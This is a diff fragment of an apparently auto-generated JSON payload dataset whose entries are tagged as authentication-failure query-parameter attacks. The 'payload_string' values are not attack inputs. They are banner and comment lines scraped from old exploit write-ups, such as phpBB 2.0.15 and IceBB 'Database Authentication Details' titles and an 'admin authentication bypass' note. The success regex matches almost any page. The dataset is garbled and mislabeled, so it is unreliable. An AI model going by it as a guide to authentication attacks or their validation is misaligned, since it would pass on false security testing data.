+    "payload_id": "OWP-408088",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|           PhpBB 2.0.15 Database Authentication Details Exploit        |\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-408089",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Use this when a thread needs authentication for viewing\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-408114",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "2 - through admin authentication bypass\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-408144",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<host> - Full Path to Authentication Dir : http://host/claroline/auth/do \\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-408326",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|   IceBB <= 1.0-rc6 Database Authentication Details    |\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-408327",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "| IceBB <= 1.0-rc6 Database Authentication Details |\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
   }
 ]
